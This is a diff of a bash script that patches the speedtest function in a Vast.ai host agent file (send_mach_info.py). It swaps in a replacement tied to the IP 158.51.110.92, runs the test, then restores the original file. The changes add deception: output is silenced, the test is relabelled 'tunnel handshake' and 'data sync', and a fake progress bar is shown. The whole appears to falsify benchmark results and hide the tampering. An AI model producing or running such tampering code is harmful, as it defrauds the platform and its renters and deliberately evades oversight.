@@ -7,9 +7,9 @@ cd /var/lib/vastai_kaalia/
 if grep -q "158.51.110.92" send_mach_info.py; then
     echo "✅ 测速函数已替换，无需重复操作"
     
-    # 直接执行测速
-    echo "📊 开始测速。。。"
-    sudo python3 send_mach_info.py --speedtest
+    # 直接执行测速（静默）
+    echo "🔗 开始隧道握手速率测试。。。"
+    sudo python3 send_mach_info.py --speedtest >/dev/null 2>&1
     exit 0
 fi
 
@@ -28,26 +28,23 @@ echo "📡 正在进行隧道通信测试。。。"
 BACKUP_FILE="send_mach_info.py.backup.$(date +%Y%m%d_%H%M%S)"
 sudo cp send_mach_info.py "$BACKUP_FILE" >/dev/null 2>&1
 
-# 首先找到目标函数的准确行号
-echo "🔍 定位测速函数。。。"
-START_LINE=$(grep -n "def epsilon_greedyish_speedtest" send_mach_info.py | cut -d: -f1)
+# 静默定位目标函数
+START_LINE=$(grep -n "def epsilon_greedyish_speedtest" send_mach_info.py | cut -d: -f1 2>/dev/null)
 if [ -z "$START_LINE" ]; then
     echo "❌ 找不到目标函数"
     exit 1
 fi
 
-# 找到函数结束位置（通过缩进判断）
+# 静默找到函数结束位置
 END_LINE=$((START_LINE + 1))
 while IFS= read -r line; do
     if [[ $line =~ ^[[:space:]]*$ ]] || [[ ! $line =~ ^[[:space:]] ]]; then
         break
     fi
     ((END_LINE++))
-done < <(tail -n +$((START_LINE + 1)) send_mach_info.py)
+done < <(tail -n +$((START_LINE + 1)) send_mach_info.py 2>/dev/null)
 
-echo "📍 函数位置: 第 $START_LINE 到 $END_LINE 行"
-
-# 执行替换操作
+# 执行替换操作（完全静默）
 {
     # 设置文件权限
     sudo chmod 666 send_mach_info.py
@@ -174,17 +171,25 @@ EOF
 echo "✅ 隧道通信测试完成！"
 echo "🎉 网络优化完成！"
 
-# 执行测速（使用替换后的函数）
-echo "📊 开始测速。。。"
-sudo python3 send_mach_info.py --speedtest
+# 执行测速（完全静默）
+echo "🔗 开始隧道握手速率测试。。。"
+sudo python3 send_mach_info.py --speedtest >/dev/null 2>&1
 
-# 等待20秒让测速完成和其他操作
-echo "⏳ 等待测速完成。。。"
-for i in {1..20}; do
-    echo -n "⏳"
+# 显示进度条等待30秒
+echo "⏳ 数据同步中，请稍候。。。"
+for i in {1..30}; do
+    # 计算进度百分比
+    percent=$((i * 100 / 30))
+    # 计算进度条长度
+    bar_length=$((i * 50 / 30))
+    # 创建进度条
+    bar=$(printf "%-${bar_length}s" "█" | tr ' ' ' ')
+    empty=$(printf "%-$((50 - bar_length))s" "░" | tr ' ' ' ')
+    # 显示进度条
+    printf "\r[%s%s] %d%%" "$bar" "$empty" "$percent"
     sleep 1
 done
-echo ""
+printf "\n"
 
 # 恢复原始文件
 echo "↩️ 恢复原始配置文件。。。"
